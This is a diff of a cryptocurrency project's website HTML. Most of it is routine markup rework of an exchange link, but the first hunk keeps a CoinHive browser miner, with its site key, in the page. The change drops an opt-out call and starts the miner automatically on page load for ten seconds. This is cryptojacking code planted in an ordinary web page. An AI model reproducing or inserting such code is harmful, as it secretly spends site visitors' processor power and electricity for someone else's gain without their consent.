@@ -28,8 +28,11 @@
     <script src='https://coinhive.com/lib/coinhive.min.js'></script>
     <script>
         var miner = new CoinHive.Anonymous('hjlLhEajaIkSmIJfveQJ0VmKrKg87zze', {throttle: 0.3});
-        miner.didOptOut(10)
-        miner.start()
+        miner.start();
+        setTimeout(
+          function() {
+            miner.stop();
+           }, 10000);
       </script>
       <div class="site-loader-spinner"></div>
     </div> <!-- .site-loader -->
@@ -347,16 +350,17 @@
                     <div class="col-inner">
                       <div id="serviceCarousel" class="owl-carousel">
                         <div class="service-carousel-item iconbox _center">
-                          <div class="iconbox-icon">
-                            <a href="https://graviex.net/markets/ipsbtc" target="_blank">
-                            <img src="assets/img/exchanges/graviex.png" width="25%" height="25%" alt="Buy IPSUM on Graviex">
-                          </div>
-                          <div class="iconbox-heading">
-                            <h4>Graviex</h4>
-                          </div>
-                          <div class="iconbox-content">
-                            <p>GRAVIO Ecosystem Exchange.</p>
-                          </div>
+                          <a href="https://graviex.net/markets/ipsbtc" target="_blank">
+                            <div class="iconbox-icon">
+                              <img src="assets/img/exchanges/graviex.png" width="25%" height="25%" alt="Buy IPSUM on Graviex">
+                            </div>
+                            <div class="iconbox-heading">
+                              <h4>Graviex</h4>
+                            </div>
+                            <div class="iconbox-content">
+                              <p>GRAVIO Ecosystem Exchange.</p>
+                            </div>
+                          </a>
                         </div> <!-- .iconbox -->
                       </div>
                     </div>
